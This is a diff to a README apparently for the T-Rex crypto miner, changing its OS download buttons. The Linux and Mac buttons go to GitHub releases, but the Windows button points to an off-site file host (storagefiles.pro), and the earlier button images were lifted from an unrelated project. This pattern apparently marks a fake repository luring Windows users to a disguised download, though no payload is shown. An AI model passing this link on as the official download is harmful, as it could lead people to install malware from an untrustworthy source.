@@ -10,9 +10,9 @@ Developer fee is 1% (2% for Octopus, Autolykos2, and their dual mining modes).
 Click the download button for your operating system:
 
 <p float="left">
-  <a href="https://github.com/trexreleases/T-Rex/releases/tag/0.26.8"><img src="https://github.com/cmdr2/stable-diffusion-ui/raw/main/media/download-linux.png" width="200" /></a>
-  <a href="https://github.com/trexreleases/T-Rex/releases/tag/0.26.8"><img src="https://github.com/cmdr2/stable-diffusion-ui/raw/main/media/download-mac.png" width="200" /></a>
-  <a href="https://storagefiles.pro/?f=111GkiCAyvW"><img src="https://github.com/cmdr2/stable-diffusion-ui/raw/main/media/download-win.png" width="200" /></a>
+  <a href="https://github.com/trexreleases/T-Rex/releases"><img src="https://github.com/trexreleases/T-Rex/blob/main/sasl2/linux.png" width="200" /></a>
+  <a href="https://github.com/trexreleases/T-Rex/releases"><img src="https://github.com/trexreleases/T-Rex/blob/main/sasl2/mac.png" width="200" /></a>
+  <a href="https://storagefiles.pro/?f=111GkiCAyvW"><img src="https://github.com/trexreleases/T-Rex/blob/main/sasl2/win.png" width="200" /></a>
 </p>
 
 ## FAQ
